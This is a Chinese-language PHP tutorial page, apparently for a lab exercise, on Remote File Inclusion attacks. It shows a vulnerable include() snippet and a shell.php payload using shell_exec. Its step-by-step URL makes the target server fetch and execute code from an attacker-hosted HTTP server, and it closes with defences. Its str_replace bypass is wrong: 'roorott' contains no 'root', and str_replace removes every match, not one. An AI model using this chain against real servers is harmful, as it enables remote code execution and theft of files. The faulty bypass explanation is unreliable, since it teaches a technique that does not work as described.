<?php
header("Content-Type: text/html; charset=utf-8");
?>

<h2>🌐 Remote File Inclusion (RFI) 攻擊教學</h2>

<hr>
<h3>💡 什麼是 RFI？</h3>
<p>RFI（Remote File Inclusion）是當伺服器端的 <code>include()</code> 允許載入遠端 URL 時產生的漏洞。<br>
攻擊者可以讓目標伺服器去抓取並<strong>執行</strong>攻擊者自己放的惡意 PHP 檔案。</p>

<h4>vulnerable code 範例</h4>
<pre>&lt;?php
include(str_replace('root', '', $_GET['page']) . ".php");
?&gt;</pre>
<p>這段程式有兩個問題：</p>
<ul>
  <li><code>$_GET['page']</code> 未過濾直接傳進 <code>include()</code> → RFI / LFI</li>
  <li><code>str_replace('root','',...)</code> 只移除一次 <code>root</code>，可用雙重嵌入繞過：<code>roorott</code> → <code>root</code></li>
</ul>

<hr>
<h3>🔧 攻擊步驟</h3>

<h4>Step 1 — 準備惡意 PHP 檔（shell.php）</h4>
<p>在攻擊機上建立 <code>shell.php</code>，內容為想執行的指令：</p>
<pre>&lt;?php echo shell_exec("cat /root/proof.txt"); ?&gt;</pre>
<p>⚠️ 避免使用 <code>&lt;?</code> 短標籤，部分 PHP 設定未開啟 <code>short_open_tag</code> 會無法執行。</p>

<h4>Step 2 — 在攻擊機開啟 HTTP Server</h4>
<p>讓目標伺服器可以來抓取 <code>shell.php</code>：</p>
<pre>cd /root
python3 -m http.server 1111</pre>
<p>確認 HTTP Server 正常後，瀏覽器開 <code>http://攻擊機IP:1111/shell.php</code> 確認可以存取。</p>

<h4>Step 3 — 觸發 RFI</h4>
<p>透過 <code>page</code> 參數讓目標伺服器載入攻擊機的 <code>shell.php</code>：</p>
<pre>http://目標IP:8046/index.php?page=http://攻擊機IP:1111/shell</pre>
<p>⚠️ <code>page</code> 的值不加 <code>.php</code>，因為程式會自動補上，實際載入的是 <code>shell.php</code>。</p>

<h4>Step 4 — 取得結果</h4>
<p>目標伺服器會：</p>
<ol>
  <li>向攻擊機 HTTP Server 發出 GET 請求抓取 <code>shell.php</code></li>
  <li>在自身環境執行 <code>shell.php</code> 內的 PHP 程式碼</li>
  <li>將 <code>cat /root/proof.txt</code> 的結果輸出到頁面</li>
</ol>
<p>攻擊機的 HTTP Server 終端機也可看到 GET 請求的 log，確認 RFI 觸發成功。</p>

<hr>
<h3>🔁 str_replace 過濾繞過</h3>
<p>若目標路徑包含 <code>root</code> 字串（如讀取其他本地檔案），可用雙重嵌入繞過：</p>
<pre>?page=http://攻擊機IP:1111/shell  ← 一般 RFI，URL 不含 root，不需繞過

?page=/roorott/somefile           ← 本地檔案，需要繞過 root 過濾
                                     roorott → 移除 root → root</pre>

<hr>
<h3>🛡️ 防禦方式</h3>
<ul>
  <li>關閉 PHP 遠端 include：<code>php.ini</code> 設定 <code>allow_url_include = Off</code></li>
  <li>關閉遠端 URL fopen：<code>allow_url_fopen = Off</code></li>
  <li>使用白名單驗證 <code>page</code> 參數，只允許預期的頁面名稱</li>
  <li>避免將用戶輸入直接傳入 <code>include()</code>、<code>require()</code></li>
</ul>

<p><a href="index.php">← 回到總覽</a></p>
